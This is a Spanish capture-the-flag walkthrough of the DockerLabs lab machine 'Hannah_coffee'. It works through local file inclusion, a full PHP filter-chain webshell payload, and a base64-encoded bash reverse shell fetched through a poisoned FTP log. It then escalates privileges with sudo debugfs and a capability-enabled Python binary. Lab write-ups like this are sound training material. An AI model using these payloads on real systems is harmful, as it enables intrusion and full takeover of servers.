Hannah_coffee-DockerLabs🇪🇸

### 1. En primer lugar vamos a desempaquear los archivos, la llevamos a un lugar seguro e iniciamos el laboratorio.

```bash
unzip hannah_coffee.zip
sudo bash ./auto_deploy.sh hannah-coffee.tar 
```

<img width="772" height="831" alt="image" src="https://github.com/user-attachments/assets/df1df41c-e33c-4d2b-9a9d-b38a34224c70" />


### 2. Después vamos a proceder a escanear los puertos abiertos mediante nmap-

```bash
 nmap -p- -sCV 172.17.0.3
```

<img width="922" height="364" alt="image" src="https://github.com/user-attachments/assets/f2463823-8fda-4eaa-a29a-af736c561083" />


### 3. Viendo el escenario que tenemos con los puertos tenemos el puerto 21 con ftp abierto y el 80 con http. Buscaremos directorios ocultos mediante ffuf.
```bash
ffuf -u "http://172.17.0.3?FUZZ=/etc/passwd" -w /usr/share/wordlists/dirbuster/directory-list-2.3-
medium.txt -fw 198
```

<img width="971" height="534" alt="image" src="https://github.com/user-attachments/assets/b3e550e9-7741-4850-bf47-7b18dfd534e7" />


### 4. Ahora encontrando el ffuf oculto es studio vamos a utilizar curl para que escupa todo el /etc/passwd

```bash
 curl "http://172.17.0.3/?studio=/etc/passwd"
```

<img width="1058" height="942" alt="image" src="https://github.com/user-attachments/assets/7c6f10bf-7fc9-46e7-a2ad-b15cbf5116ae" />

#### 4.2 Iremos a `http://172.17.0.3/index.php?studio=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd` para poder ver la clave para el RCE.

### 5. Vamos a generar la cadena mediante el exploit de RCE via PHP Filter Chain Generator (*https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py*)

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

<img width="1063" height="1044" alt="image" src="https://github.com/user-attachments/assets/8532d5ae-a0fc-46df-b3b3-1e681a8bf201" />

### 6. Ahora aplicaremos la cadena en la url 

```bash
http://172.17.0.3/index.php?0=id&studio=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

<img width="1188" height="333" alt="image" src="https://github.com/user-attachments/assets/54b31983-1fe3-445c-8239-d6aba0990383" />


### 6.2 Ahora continuamos con la reverse shell
```bash
curl -s "http://172.17.0.3/index.php?studio=../../../../var/log/vsftpd.log&cmd=echo%20%20|YmFzaCAtaSA+JiAvZGV2L3RjcC9UVV9JUF9MT0NBTC80NDQ0IDA+JjEK%20base64%20-d%20|%20bash"```
```

### 7. Entramos al sistema mediante escuchar por `netcast`

```bash
nc -nlvp 4444
```

<img width="733" height="354" alt="image" src="https://github.com/user-attachments/assets/326ff4b7-d36b-4127-bc28-c9ac832f7687" />


### 8. Para escalar de privilegios haremos `sudo -l` para poder ver los binarios que podemos modificar.

<img width="727" height="415" alt="image" src="https://github.com/user-attachments/assets/2c7bf9b5-74c7-4a63-a9cc-3f5109001b7c" />


### 9. Utilizaremos el debugfs.
```bash
sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
```

<img width="735" height="149" alt="image" src="https://github.com/user-attachments/assets/20f9c80e-59a0-44a1-a130-8ffe3d093d46" />


### 10. Obtenemos la bash de hannah con `!/bin/bash` y utilizaremos el `id` y los ´ls -la´ para ver los procesos que están corriendo en la máquina.

<img width="734" height="311" alt="image" src="https://github.com/user-attachments/assets/56b72416-2259-4b76-b83a-e27ef36d776e" />

### 11. Utilizamos `getcap -r / 2>/dev/null` para ver que permisos tiene ese binario y `/opt/priv-python -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'` para explotar la máquina mediante uun cambio de UID de la de hannah a la de root y poder escalar privilegios.

<img width="737" height="87" alt="image" src="https://github.com/user-attachments/assets/26ed3bde-6499-46a1-ab25-7186fdf0ea71" />


## Root Key

<img width="710" height="62" alt="image" src="https://github.com/user-attachments/assets/9325fae6-fde3-443c-bce8-d091fd48707c" />


## Hannah Key

<img width="597" height="63" alt="image" src="https://github.com/user-attachments/assets/66d963ba-56be-4f00-bb79-19495870a1f9" />


